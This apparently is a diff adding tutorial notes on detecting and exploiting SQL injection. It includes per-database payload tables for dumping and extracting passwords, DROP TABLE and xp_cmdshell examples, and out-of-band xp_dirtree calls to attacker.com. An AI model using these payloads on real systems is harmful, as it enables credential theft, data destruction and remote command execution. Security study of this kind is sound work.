@@ -1,0 +1,1217 @@
+
+
+> **How to Detect SQL Injection Vulnerabilities**
+
+SQL Injection (SQLi) occurs when an application improperly processes user input, allowing attackers to manipulate SQL queries. Detecting SQLi requires testing input fields, headers, or parameters for unexpected behavior.
+
+
+ **🛠 Manual Detection Techniques**
+
+ **1️⃣** Error-Based Testing
+
+ Enter a single quote (`'`) or double quote (`"`) and check for errors.
+```
+' OR '1'='1
+```
+If an error like _"Syntax error in SQL statement"_ appears, it indicates SQL injection vulnerability.
+
+
+**2️⃣** Boolean-Based Testing
+
+ Inject **true and false conditions** to check for different responses.
+```
+' OR 1=1 --   (Always true condition) 
+' OR 1=2 --   (Always false condition)
+```
+ If the application's response changes based on the condition, it's vulnerable.
+
+
+**3️⃣** Time-Based Testing
+
+If SQL queries can execute time delays, the server response time will change.
+```
+' OR SLEEP(5) --
+```
+ If the response time increases, **SQL injection is likely present**.
+
+
+**4️⃣** Out-of-Band (OAST) Testing
+
+Use payloads that send **DNS or HTTP requests** to an external server.
+```
+'; exec master..xp_dirtree '\\attacker.com\foo' --
+```
+If a request is received, the database executed the command, confirming SQLi.
+
+
+---
+
+>**🔍 SQL Injection in Different Query Locations**
+
+**1️⃣** WHERE Clause (Most Common)
+```
+SELECT * FROM users WHERE username = 'admin' AND password = '123';
+
+
+' OR '1'='1' --    # Injection Payload
+
+
+SELECT * FROM users WHERE username = 'admin' OR '1'='1' -- ' AND password = '123';
+```
+
+
+**2️⃣** UPDATE Statement
+```
+UPDATE users SET role = 'admin' WHERE username = 'guest';
+
+
+' OR '1'='1 --   # Injection Payload
+
+
+UPDATE users SET role = 'admin' WHERE username = 'guest' OR '1'='1' -- ;
+```
+
+
+**3️⃣** INSERT Statement
+```
+INSERT INTO users (username, email) VALUES ('test', 'test@example.com');
+
+
+'); DROP TABLE users; --    # Injection Payload
+
+INSERT INTO users (username, email) VALUES ('test', 'test@example.com'); DROP TABLE users; -- ';
+```
+
+
+**4️⃣** ORDER BY Clause (Blind Injection)
+```
+SELECT name FROM products ORDER BY 1;
+
+
+ORDER BY (SELECT CASE WHEN (1=1) THEN 1 ELSE 2 END)    # Injection Payload
+
+
+SELECT name FROM products ORDER BY (SELECT CASE WHEN (SELECT LENGTH(username) FROM users WHERE id=1) = 5 THEN 1 ELSE 2 END);
+
+```
+📌 **Explanation:**
+
+- The `CASE` statement **tests** whether the length of `username` is **5**.
+- If true, it returns **1** (valid order), else **2** (invalid).
+
+---
+
+
+> **🛠 Retrieving Hidden Data Using SQL Injection**
+
+
+**1️⃣** Original Query (Legitimate Request)
+
+When a user selects a category, such as "Gifts," the application sends this request:
+```
+https://insecure-website.com/products?category=Gifts
+```
+
+The backend processes it using the following SQL query:
+```
+SELECT * FROM products WHERE category = 'Gifts' AND released = 1;
+```
+`released = 1` ensures **only released products** are shown.
+
+
+**2️⃣** SQL Injection - Viewing All Unreleased Products
+
+An attacker modifies the URL to:
+```
+https://insecure-website.com/products?category=Gifts'--
+```
+
+Which results in the following SQL query:
+```
+SELECT * FROM products WHERE category = 'Gifts'--' AND released = 1;
+```
+ Effect: The `--` comment removes the filter (`AND released = 1`), showing all products, including unreleased ones.
+
+
+ **3️⃣** SQL Injection - Viewing All Products from Any Category
+
+Instead of filtering by category, an attacker injects:
+```
+https://insecure-website.com/products?category=Gifts'+OR+1=1--
+```
+
+Which results in:
+```
+SELECT * FROM products WHERE category = 'Gifts' OR 1=1 --' AND released = 1;
+```
+ Effect: `1=1` is always true, causing all products to be displayed, even if the user isn't supposed to see them.
+
+> [!NOTE]
+> **🔴 Dangerous Impact of OR 1=1**
+> 
+> ⚠️ **Warning:**
+> 
+> - The `OR 1=1` condition can be very dangerous if it affects `UPDATE` or `DELETE` statements.
+> - Example: If the application uses the same input in an `UPDATE` query:
+> ```
+> UPDATE products SET price = 1 WHERE category = 'Gifts' OR 1=1;
+> ```
+> 
+> 🚨 All product prices could be set to $1!
+
+
+#### UNION 
+
+Is used to execute two select statements together. but both tables used share same number of columns.
+```shell-session
+mysql> SELECT * FROM ports UNION SELECT * FROM ships;
+```
+
+for uneven columns, we add junk data/ junk column to the table that have less columns. we can add strings, numbers as junk data, but make sure to use same datatype  
+
+> [!NOTE]
+> **For advanced SQL injection, we may want to simply use 'NULL' to fill other columns, as 'NULL' fits all data types.**
+
+```sql
+SELECT * from products where product_id = '1' UNION SELECT username, 2 from passwords
+```
+Here we added number 2 as a junk column. 
+
+#### Union Injection
+
+- ORDER BY
+- UNION 
+are for identifying columns. 
+
+```sql
+' order by 1-- -
+```
+```sql
+cn' UNION select 1,2,3-- -
+cn' UNION select NULL,NULL,NULL-- -
+```
+
+Now that we know how many columns by using anyone methods mentioned above and we inject union
+
+```sql
+' UNION select 1,@@version,3,4-- -
+```
+We have to specific location of our output. because all columns are not meant to show output to user. so identify which one will give output
+
+HTTP responses 
+
+- `Apache` or `Nginx`,  webserver is running on Linux, so the DBMS is likely `MySQL`.  
+- webserver is `IIS`, so it is likely to be `MSSQL`.
+
+To identify whether mysql is running in target server, then we have to use
+
+| Payload            | When to Use                          | Expected Output                                                                      | Wrong Output                            |
+| ------------------ | ------------------------------------ | ------------------------------------------------------------------------------------ | --------------------------------------- |
+| `SELECT @@version` | **When we have full query output**   | MySQL Version 'i.e. `10.3.22-MariaDB-1ubuntu1`'.  In MSSQL it returns MSSQL version. | Error with other DBMS.                  |
+| `SELECT POW(1,1)`  | **When we only have numeric output** | 1                                                                                    | Error with other DBMS                   |
+| `SELECT SLEEP(5)`  | **Blind/No Output**                  | Delays page response for 5 seconds and returns `0`.                                  | Will not delay response with other DBMS |
+
+To pull data from tables using `UNION SELECT`. To do so, we need the following information:
+
+- List of databases
+- List of tables within each database
+- List of columns within each table
+
+The [INFORMATION_SCHEMA](https://dev.mysql.com/doc/refman/8.0/en/information-schema-introduction.html) database contains metadata about the databases and tables present on the server.
+
+```sql
+SELECT * FROM <database_name>.<table_name>; -- requesting tables from another database
+```
+
+SCHEMATA is a table which contains details of databases and `SCHEMA_NAME` column contains all the database names currently present.
+```shell-session
+mysql> SELECT SCHEMA_NAME FROM INFORMATION_SCHEMA.SCHEMATA;
+```
+
+same thing but as a sqli
+```sql
+' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- -
+```
+
+**To identify which database the web application is running to retrieve data from use `database()`
+
+**TABLES**
+
+The [TABLES](https://dev.mysql.com/doc/refman/8.0/en/information-schema-tables-table.html) table contains information about all tables throughout the database. there are many columns but we retrieve only two from it.
+
+- `TABLE_NAME` column stores table names
+- `TABLE_SCHEMA` column points to the database each table belongs to.
+
+```sql
+cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='dev'-- -
+```
+
+**COLUMNS**
+
+In **columns** table from information_schema we retrieve column names of the credentials table 
+```sql
+cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'-- -
+```
+
+Now that we have all the three information to retrieve data from the database we want.
+```sql
+' UNION select 1, username, password, 4 from dev.credentials-- -
+```
+
+To dump the `username` and `password` data from the `credentials` table in the `dev` database:
+
+```sql
+cn' UNION SELECT 1, username, password, 4 FROM dev.credentials-- -
+```
+
+---
+
+ **Complete SQL Injection Flow for Database Enumeration**
+
+1. **Identify the DBMS**: Use `SELECT @@version` to determine the DBMS type (e.g., MySQL).
+2. **List Databases**: Use the `INFORMATION_SCHEMA.SCHEMATA` table to list all databases.
+3. **Find the Current Database**: Use `SELECT database()` to find the active database.
+4. **List Tables**: Query `INFORMATION_SCHEMA.TABLES` to list all tables within a target database.
+5. **List Columns**: Query `INFORMATION_SCHEMA.COLUMNS` to enumerate the columns in a target table.
+6. **Dump Data**: Use the `UNION` operator to retrieve sensitive data from the tables.
+
+---
+
+
+>  **MySQL SQL Injection Syntax**
+
+**💡 MySQL Commenting Techniques**
+
+1. **Double-dash (`--`) requires a space after it**
+    `' OR 1=1 --`  
+
+2. **Using the hash (`#`) for comments**
+    `' OR 1=1 #`  
+
+
+**💥 Example - UNION Injection**
+```
+' UNION SELECT null, user() #
+```
+ `user()` retrieves the **current database user**.
+
+
+---
+
+
+ **Oracle SQL Injection Syntax**
+
+**💡 Oracle SELECT Queries Require `FROM DUAL`**
+
+- Oracle doesn’t allow `SELECT` without `FROM`.
+- DUAL is a built-in dummy table used for this purpose.
+
+**💥 Example - UNION Injection**
+```
+' UNION SELECT NULL FROM DUAL--
+```
+ The `DUAL` table ensures that **Oracle doesn’t throw an error**.
+
+
+ **🛠 Exploiting Oracle Using `SELECT FROM ALL_USERS`**
+
+- Fetch all database usernames:
+```
+' UNION SELECT username FROM ALL_USERS--
+```
+
+
+ **2️⃣ Retrieve Database Version**
+```
+' UNION SELECT banner, NULL FROM v$version--
+```
+
+**3️⃣ Retrieve Current Database Name**
+```
+' UNION SELECT sys_context('USERENV', 'CURRENT_SCHEMA'), NULL FROM dual--
+```
+
+ **4️⃣ Retrieve List of All Users**
+```
+' UNION SELECT username, NULL FROM all_users--
+```
+- `all_users`: A system table storing all database usernames.
+
+**5️⃣ Retrieve Table Names**
+```
+' UNION SELECT table_name, NULL FROM all_tables--
+```
+
+**6️⃣ Retrieve Column Names for a Specific Table**
+```
+' UNION SELECT column_name, NULL FROM all_tab_columns WHERE table_name='USERS'--
+```
+- `all_tab_columns`: Stores column details of tables.
+
+
+**7️⃣ Extract Usernames and Passwords**
+```
+' UNION SELECT username, password FROM users--
+```
+
+
+---
+
+
+**Microsoft SQL Server (MSSQL) SQL Injection Syntax**
+
+
+💡 MSSQL Supports Stacked Queries (`;`)
+
+- Unlike MySQL & Oracle, MSSQL allows multiple queries in one request.
+- Attackers can execute multiple commands.
+
+
+**💥 Example - Dumping Database Information**
+```
+'; SELECT @@version; -- 
+```
+ `@@version` **reveals the database version**.
+
+
+**💥 Example - Executing System Commands (`xp_cmdshell`)**
+```
+`'; EXEC xp_cmdshell('whoami'); --`  
+```
+`xp_cmdshell` **executes system commands**, allowing **remote code execution (RCE)** if permissions allow.
+
+
+
+**PostgreSQL SQL Injection Syntax**
+
+**💡 PostgreSQL Supports `CURRENT_USER` & `pg_sleep()`**
+
+- `pg_sleep(seconds)` is useful for **time-based blind SQL injection**.
+
+
+**💥 Example - Union Injection**
+```
+' UNION SELECT NULL, current_user--
+
+
+' OR 1=1; SELECT pg_sleep(5);--            Time-Based Injection
+```
+Returns the current database user.
+
+---
+
+>  **Listing the contents of the database**
+
+you can query `information_schema.tables` to list the tables in the database
+```
+SELECT * FROM information_schema.tables
+```
+
+
+You can then query `information_schema.columns` to list the columns in individual tables
+```
+SELECT * FROM information_schema.columns WHERE table_name = 'Users'
+```
+
+---
+
+> **🛠 Retrieving Multiple Values Within a Single Column (SQL Injection)**
+
+
+Different databases have different string concatenation operators. Attackers use these to combine multiple values (e.g., `username` and `password`) within a single column.
+
+
+🔹 Database-Specific String Concatenation
+
+**✅ Oracle Injection**
+```
+' UNION SELECT username || '~' || password FROM users--
+```
+- Uses `||` for string concatenation.
+- Returns results like:
+```
+administrator~s3cure 
+wiener~peter 
+carlos~montoya
+```
+
+
+**✅ MySQL Injection**
+```
+' UNION SELECT CONCAT(username, '~', password) FROM users--  
+```
+- Uses `CONCAT()` to merge values.
+- Works across different MySQL versions.
+
+
+**✅ MSSQL Injection**
+```
+' UNION SELECT username + '~' + password FROM users--  
+```
+- Uses `+` for string concatenation.
+
+
+**✅ PostgreSQL Injection**
+```
+' UNION SELECT username || '~' || password FROM users--  
+```
+- Uses `||`, similar to Oracle.
+
+---
+
+> **Blind SQL injection**
+
+Blind SQL injection occurs when an application is vulnerable to SQL injection, but it does not directly display query results or database errors in its responses. Instead, attackers infer database information based on conditional responses, time delays, or out-of-band interactions.
+
+> 📌 **Exploiting Blind SQL Injection with Conditional Responses**
+
+Consider a scenario where a website uses **tracking cookies** for analytics:
+
+**✅ STEP1**   => Choosing our testing parameter.
+
+**HTTP Request with Cookie:**
+```
+Cookie: TrackingId=u5YD3PapBcR4lN3e7Tj4
+```
+
+ **SQL Query Processed on the Backend:**
+```
+SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'u5YD3PapBcR4lN3e7Tj4'
+```
+The query is vulnerable to SQL injection, but the attacker cannot see direct results. However, they can check the website's behavior to infer information.
+
+
+**✅ STEP2**  => Verification. Whether the parameter is vulnerable to blind SQLi or not. 
+
+
+📌 **Payload 1 (Always True Condition)**
+```
+Cookie: TrackingId=xyz' AND '1'='1'--
+```
+ If the app **returns "Welcome back"**, it confirms the query executed successfully.
+
+📌 **Payload 2 (Always False Condition)**
+```
+Cookie: TrackingId=xyz' AND '1'='2'--
+```
+ If the app **does not return "Welcome back"**, it confirms this condition was false.
+
+
+**✅ STEP3** => Extracting Data via Binary Search (Character-by-Character)
+
+1. Checking users table exists or not
+
+```
+TrackingId=xyz' AND (SELECT 'a' FROM users LIMIT 1)='a'--
+```
+This query will return `'a'` for every row in the users table. It will break the query if there are many rows so we limit to `1`. if the query returns `'a'` then it will be equal to `'a'` so `True`. `(True AND True)`. We will see welcome back 
+
+If not then the `AND` operator return `False`
+
+
+
+2.  Checking administrator exists or not
+
+```
+'AND (SELECT username FROM users WHERE username = 'administrator')='administrator' --
+```
+
+
+3. Enumerate the password length of ‘administrator’. Using ==Intruder== in 2.
+
+```
+' AND (SELECT 'a' FROM users WHERE username = 'administrator' AND LENGTH(password)>$2$)='a'--
+```
+Continue doing this, increasing the length amount until your query evaluates to False
+
+**Payload Explanation**
+- **`LENGTH(password)=20`**: This is your specific "Yes/No" question.
+- **`SELECT 'a' ... ='a'`**: This is the "Syntax Glue". If the length is 20, the subquery returns `'a'`, making the statement `'a'='a'`, which is **True** and we will see `Welcome back` message in the website
+
+The attacker can extract the **Administrator's password** one letter at a time.
+
+> [!NOTE]
+> SUBSTRING(column_name, start_position, length)
+
+4. Iterating the password characters with length.
+
+```
+Cookie: TrackingId=xyz' AND (SELECT SUBSTRING(password,$1$,1) from users where username='administrator')='$a$'--
+```
+- `$1$` helps us to iterate through position. In this case, the password length is 20, so we will determine it from 1 to 20 in intruder. 
+- `$a$` is the character. If the first char is equals to `a` then it returns `True` we will see `welcome back `
+
+
+🟠 ORACLE  Conditional Response
+
+| Step | Goal            | Payload                                                                                        |
+| ---- | --------------- | ---------------------------------------------------------------------------------------------- |
+| 1    | Always TRUE     | `xyz' AND '1'='1'--`                                                                           |
+| 2    | Always FALSE    | `xyz' AND '1'='2'--`                                                                           |
+| 3    | Table exists    | `xyz' AND (SELECT 'a' FROM users WHERE rownum=1)='a'--`                                        |
+| 4    | Admin exists    | `xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND rownum=1)='a'--`           |
+| 5    | Password length | `xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>5)='a'--` |
+| 6    | Extract char    | `xyz' AND (SELECT SUBSTR(password,1,1) FROM users WHERE username='administrator')='a'--`       |
+
+🟣 POSTGRESQL
+
+| Step | Goal            | Payload                                                                                        |
+| ---- | --------------- | ---------------------------------------------------------------------------------------------- |
+| 1    | Always TRUE     | `xyz' AND '1'='1'--`                                                                           |
+| 2    | Always FALSE    | `xyz' AND '1'='2'--`                                                                           |
+| 3    | Table exists    | `xyz' AND (SELECT 'a' FROM users LIMIT 1)='a'--`                                               |
+| 4    | Admin exists    | `xyz' AND (SELECT 'a' FROM users WHERE username='administrator' LIMIT 1)='a'--`                |
+| 5    | Password length | `xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>5)='a'--` |
+| 6    | Extract char    | `xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a'--`    |
+
+🟢 MYSQL
+
+|Step|Goal|Payload|
+|---|---|---|
+|1|Always TRUE|`xyz' AND '1'='1'--`|
+|2|Always FALSE|`xyz' AND '1'='2'--`|
+|3|Table exists|`xyz' AND (SELECT 'a' FROM users LIMIT 1)='a'--`|
+|4|Admin exists|`xyz' AND (SELECT 'a' FROM users WHERE username='administrator' LIMIT 1)='a'--`|
+|5|Password length|`xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>5)='a'--`|
+|6|Extract char|`xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a'--`|
+
+🔵 MSSQL
+
+| Step | Goal            | Payload                                                                                           |
+| ---- | --------------- | ------------------------------------------------------------------------------------------------- |
+| 1    | Always TRUE     | `xyz' AND '1'='1'--`                                                                              |
+| 2    | Always FALSE    | `xyz' AND '1'='2'--`                                                                              |
+| 3    | Table exists    | `xyz' AND (SELECT TOP 1 'a' FROM users)='a'--`                                                    |
+| 4    | Admin exists    | `xyz' AND (SELECT TOP 1 'a' FROM users WHERE username='administrator')='a'--`                     |
+| 5    | Password length | `xyz' AND (SELECT TOP 1 'a' FROM users WHERE username='administrator' AND LEN(password)>5)='a'--` |
+| 6    | Extract char    | `xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a'--`       |
+
+---
+
+
+
+> 📌 **Exploiting Blind SQL Injection by Triggering Conditional Errors**
+
+Some applications do not change behavior when SQL queries return different results. However, attackers can force errors to detect whether a condition is true or false.
+
+**✅ STEP1**   => Choosing our testing parameter.
+
+**Example Scenario: Tracking ID Cookie**
+
+Consider an application that processes tracking cookies:
+```
+Cookie: TrackingId=xyz
+```
+
+**Backend SQL Query Processing the Cookie:**
+```
+SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'xyz'
+```
+If the application does not show different responses for Boolean conditions, the attacker can trigger an error to infer information.
+
+
+
+**✅ STEP2**  => Verification. Whether the parameter is vulnerable to blind SQLi or not.  
+
+
+| TrackingId = 'xyz' \|\| (select '') \|\| '               | SQL           |
+| -------------------------------------------------------- | ------------- |
+| **TrackingId = 'xyz' \|\| (select '' from dual) \|\| '** | **Oracle DB** |
+
+%% The DB is Oracle in this case. %%
+
+An attacker can send the following **two payloads** to check how the application reacts:
+
+ **Payload 1: Condition is False (No Error)**
+```
+xyz' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a
+```
+No error → The condition (1=2) is false
+
+
+**Payload 2: Condition is True (Causes Error)**
+```
+xyz' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a
+```
+ Causes a divide-by-zero error → Confirms condition is true
+
+If the response changes when an error occurs, the attacker can infer the truth of an injected condition.
+
+
+**✅ STEP3** => Extracting Data via Binary Search (Character-by-Character)
+
+1. Check whether the table exists or not
+```
+'||(SELECT '' FROM users where rownum=1)||'
+```
+Same as before. Here we are checking the users table exist or not. 
+
+This query will return `''` for every row in the users table. It will break the query if there are many rows so we limit to `1` using `rownum=1`. If the query returns `''` then it will be equal to `True` because of the OR(||).
+
+
+2. If the user 'administrator ' exist or not
+```
+'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
+```
+
+**Order of execution in SQL query=> `FROM` clause will execute first and then the `SELECT` clause.** 
+
+- This targets the `users` table specifically.
+    - **Crucial Point:** If the user `administrator` does not exist, the `SELECT` returns no rows. If it returns no rows, the `CASE` never executes, and **no error** will occur even if the condition is "True."  You will see `200 ok` as response
+- **`WHEN (1=1)`**: This is your test variable.
+    - Since `1=1` is **True**, the `THEN TO_CHAR(1/0)`  is executed and you will see an error.
+- If you see an error then the user `administrator` exist.
+
+
+3. Determine the length of the password
+```
+' || (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator' and LENGTH(password)>$1$) || '
+```
+
+- **`FROM users WHERE username='administrator'`**: This ensures the query only runs if the user actually exists. If the username was wrong, the `CASE` statement would never be reached, and you would never get an error (a "False Negative").
+- **`and LENGTH(password)>1`**: This is your specific test.
+- **`THEN TO_CHAR(1/0)`**: If the password length is indeed greater than 1, Oracle executes the division by zero.  You will see an error in response.
+- **`ELSE ''`**: If the password is 1 character or less, the query returns an empty string and the page loads normally. You will see `200 ok` as response
+
+
+4. Determine the password
+```
+' || (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator' and SUBSTR(password, $1$, 1) = '$a$') || '
+```
+- **`SUBSTR(password, $1$, 1) = '$a$'`**:
+    - **`$1$`**: This is the character position (e.g., 1st letter, 2nd letter).
+    - **`$a$`**: This is your guess for that letter (e.g., 'a', 'b', '1', etc.).
+- **`THEN TO_CHAR(1/0)`**: If your guess is correct, the `CASE` evaluates to true, triggers a division-by-zero, and the server crashes with a **500 Error**.
+- **`ELSE ''`**: If your guess is wrong, the query completes successfully, and you get a **200 OK**.
+
+
+
+Using this technique, an attacker can retrieve one character at a time from sensitive fields like passwords.
+
+ **Extracting the First Character of Administrator's Password**
+```
+xyz' AND (SELECT CASE WHEN (Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') THEN 1/0 ELSE 'a' END FROM Users)='a
+```
+
+**How This Works:**
+- If no error occurs, the first character of the password is ≤ 'm'
+- If an error occurs, the first character is > 'm'
+- The attacker repeats this process for each character.
+
+
+🔵 MSSQL
+
+| Step | Purpose         | Payload                                                                                                                   |
+| ---- | --------------- | ------------------------------------------------------------------------------------------------------------------------- |
+| 1    | Test injection  | `xyz' AND (SELECT '')='`                                                                                                  |
+| 2    | False condition | `xyz' AND (SELECT CASE WHEN 1=2 THEN 1/0 ELSE 'a' END)='a`                                                                |
+| 3    | True condition  | `xyz' AND (SELECT CASE WHEN 1=1 THEN 1/0 ELSE 'a' END)='a`                                                                |
+| 4    | Table exists    | `' AND (SELECT TOP 1 '' FROM users)='`                                                                                    |
+| 5    | User exists     | `' AND (SELECT CASE WHEN EXISTS(SELECT 1 FROM users WHERE username='administrator') THEN 1/0 ELSE 'a' END)='a`            |
+| 6    | Password length | `' AND (SELECT CASE WHEN LEN(password)>5 THEN 1/0 ELSE 'a' END FROM users WHERE username='administrator')='a`             |
+| 7    | Extract char    | `' AND (SELECT CASE WHEN SUBSTRING(password,1,1)='a' THEN 1/0 ELSE 'a' END FROM users WHERE username='administrator')='a` |
+
+🟢 MYSQL
+
+| Step | Purpose         | Payload                                                                                               |
+| ---- | --------------- | ----------------------------------------------------------------------------------------------------- |
+| 1    | Test injection  | `xyz' AND (SELECT '')='`                                                                              |
+| 2    | False condition | `xyz' AND IF(1=2,1/0,'a')='a`                                                                         |
+| 3    | True condition  | `xyz' AND IF(1=1,1/0,'a')='a`                                                                         |
+| 4    | Table exists    | `' AND (SELECT '' FROM users LIMIT 1)='`                                                              |
+| 5    | User exists     | `' AND IF((SELECT COUNT(*) FROM users WHERE username='administrator')>0,1/0,'a')='a`                  |
+| 6    | Password length | `' AND IF((SELECT LENGTH(password) FROM users WHERE username='administrator')>5,1/0,'a')='a`          |
+| 7    | Extract char    | `' AND IF((SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a',1/0,'a')='a` |
+
+🟣 POSTGRESQL
+
+| Step | Purpose           | Payload                                                                                                                   |
+| ---- | ----------------- | ------------------------------------------------------------------------------------------------------------------------- |
+| 1    | Test injection    | `xyz' AND (SELECT '')='`                                                                                                  |
+| 2    | False condition   | `xyz' AND (SELECT CASE WHEN 1=2 THEN 1/0 ELSE 'a' END)='a`                                                                |
+| 3    | True condition    | `xyz' AND (SELECT CASE WHEN 1=1 THEN 1/0 ELSE 'a' END)='a`                                                                |
+| 4    | Table exists      | `' AND (SELECT '' FROM users LIMIT 1)='`                                                                                  |
+| 5    | User exists       | `' AND (SELECT CASE WHEN EXISTS(SELECT 1 FROM users WHERE username='administrator') THEN 1/0 ELSE 'a' END)='a`            |
+| 6    | Password length   | `' AND (SELECT CASE WHEN LENGTH(password)>5 THEN 1/0 ELSE 'a' END FROM users WHERE username='administrator')='a`          |
+| 7    | Extract character | `' AND (SELECT CASE WHEN SUBSTRING(password,1,1)='a' THEN 1/0 ELSE 'a' END FROM users WHERE username='administrator')='a` |
+
+---
+
+> **Exploiting Blind SQL Injection with Time Delays**
+
+Error-based SQL injection occurs when an attacker can **trigger database errors** to infer or extract sensitive data from the database. This technique works even in **blind SQL injection** scenarios where responses are not directly displayed.
+
+**✅ STEP1** => Identify Which DB. So just fuzz 
+
+| DB         | PAYLOAD                                                                              |
+| ---------- | ------------------------------------------------------------------------------------ |
+| Oracle     | `TrackingId=xyz' \|\| dbms_pipe.receive_message(('a'),10)--`                         |
+| Microsoft  | `TrackingId=xyz' \|\| WAITFOR DELAY '0:0:10'--`                                      |
+| PostgreSQL | `TrackingId=xyz' \|\| SELECT pg_sleep(10)--` OR `TrackingId=xyz' \|\|pg_sleep(10)--` |
+| MySQL      | `TrackingId=xyz' \|\| SELECT SLEEP(10)--`                                            |
+
+**✅ STEP2** => Verifying Table
+
+```
+' || (SELECT CASE WHEN (1=0) THEN pg_sleep(10) else pg_sleep(-1) END)--
+```
+- **`SELECT CASE WHEN (1=1)`**: This is your test condition.
+- **`THEN pg_sleep(10)`**: If the condition is **True**, the database executes the `pg_sleep` function, which pauses the query execution for 10 seconds.
+- **`ELSE pg_sleep(-1)`**: If the condition is **False**, it attempts a negative sleep (which PostgreSQL ignores or executes instantly), resulting in an immediate response.
+
+```
+' || (SELECT CASE WHEN (username='administrator') THEN pg_sleep(10) else pg_sleep(-1) END from users)--
+```
+- **`THEN pg_sleep(10)`**: If the administrator user exists in the users table, it's **True**. The database executes the `pg_sleep` function, which pauses the query execution for 10 seconds.
+- **`ELSE pg_sleep(-1)`**: If the administrator user doesn't exist in the users table, it's **False**. It attempts a negative sleep (which PostgreSQL ignores or executes instantly), resulting in an immediate response.
+
+
+**✅ STEP3** => Determining Password length
+
+```
+' || (SELECT CASE WHEN (username='administrator' AND LENGTH(password)>$1$) THEN pg_sleep(10) else pg_sleep(-1) END from users)--
+```
+
+- **`username='administrator'`**: Targets the specific account.
+- **`LENGTH(password)>§1§`**: This is your incrementing test.
+- **`THEN pg_sleep(10)`**: If the password is longer than your guess, the database will hang for 10 seconds.
+- **`ELSE pg_sleep(-1)`**: If the guess is false, it returns immediately (PostgreSQL treats negative or zero sleep as no delay).
+- **`FROM users`**: Executes the logic within the context of the `users` table.
+
+**✅ STEP4** => Determine Password of the user
+
+```
+' || (SELECT CASE WHEN (username='administrator' AND SUBSTRING(password , $1$, 1)='$a$') THEN pg_sleep(10) else pg_sleep(-1) END from users)--
+```
+
+Use one thread at a time. Make changes in resource poll.
+
+- **`SUBSTRING(password, $1$, 1) = '$a$'`**:
+    
+    - **`$1$`**: Represents the character position you are testing (e.g., character 1, then 2, etc.).
+    - **`$a$`**: Represents your "guess" for the character at that position (e.g., 'a', 'b', '1').
+- **`THEN pg_sleep(10)`**: If the character at that position matches your guess, the database pauses for 10 seconds.
+- **`ELSE pg_sleep(-1)`**: If the guess is wrong, the database responds immediately.
+
+
+---
+
+> **🛠 Extracting Sensitive Data via Verbose SQL Error Messages**
+
+
+📌 **Concept:**
+- Some databases return detailed error messages when a query fails due to an invalid operation.
+- Attackers can exploit these errors to extract sensitive data.
+- The CAST() function is often used to force errors and leak data.
+
+
+**🔹 Example 1: Detecting SQL Injection via Error Messages**
+
+Let's say an application has this vulnerable query:
+```
+SELECT * FROM tracking WHERE id = '1234'
+```
+
+An attacker injects a **single quote (`'`)** to test for vulnerabilities:
+```
+https://insecure-website.com/tracking?id='
+```
+
+The application responds with an error:
+```
+Unterminated string literal started at position 52 in SQL SELECT * FROM tracking WHERE id = '''. Expected char
+```
+
+**What does this error tell us?**
+- The query breaks due to an extra `'`.
+- The attacker knows where they are injecting in the SQL statement.
+- They can now modify the query by commenting out the rest with `--`.
+
+
+**🔹 Example 2: Extracting Data via CAST()**
+
+Some databases include query results in error messages. Attackers can exploit this by forcing type conversion errors.
+
+**Malicious Payload**
+```
+CAST ((SELECT 1)AS INT)--    # Test
+```
+
+```
+SELECT CAST((SELECT password FROM users WHERE username='admin') AS INT)
+```
+
+**Expected Behavior**
+- If the `password` column contains text (e.g., `"s3cr3tP@ss"`),
+- The database tries to convert it to an integer (which fails),
+- It throws an error containing the actual password:
+
+**Example error message:**
+```
+ERROR: invalid input syntax for type integer: "s3cr3tP@ss"
+```
+🎯 The attacker now knows the admin password!
+
+
+
+**🔹 Example 3: Extracting Data from Specific Rows**
+
+The attacker can extract one row at a time using `LIMIT`:
+```
+SELECT CAST((SELECT username FROM users LIMIT 1 OFFSET 0) AS INT)
+```
+
+If the database leaks an error:
+```
+ERROR: invalid input syntax for type integer: "admin"
+```
+
+Now, they can try:
+```
+SELECT CAST((SELECT username FROM users LIMIT 1 OFFSET 1) AS INT)
+```
+And continue iterating through the database.
+
+
+---
+
+> **📡 Deep Dive into Out-of-Band (OAST) SQL Injection Exploitation**
+
+
+**🔹 What is Out-of-Band (OAST) SQL Injection?**
+
+OAST-based SQL injection is an **advanced exploitation technique** used when:
+- The application does not return query results in HTTP responses.
+- Error messages are suppressed, making error-based SQL injection ineffective.
+- Timing-based techniques (e.g., `SLEEP()` or `WAITFOR DELAY`) do not work.
+- The application executes asynchronous SQL queries in the background.
+
+💡 Instead of relying on visible responses, attackers use indirect network interactions (DNS, HTTP, or SMB) to leak data to an external server.
+
+
+**🔹 How OAST SQL Injection Works**
+
+
+📌 **Step 1: Testing for Out-of-Band Vulnerability**
+
+To determine if an application is vulnerable to OAST-based SQL injection, an attacker sends an input that forces the database to perform a network request.
+
+
+ **Example: Microsoft SQL Server (`xp_dirtree`)**
+
+Attack Payload:
+```
+'; exec master..xp_dirtree '//attacker.com/a'--
+```
+
+🛠 **What Happens?**
+- The payload executes a system function (`xp_dirtree`), which attempts to list a remote directory.
+- This forces SQL Server to send a DNS request to `attacker.com`.
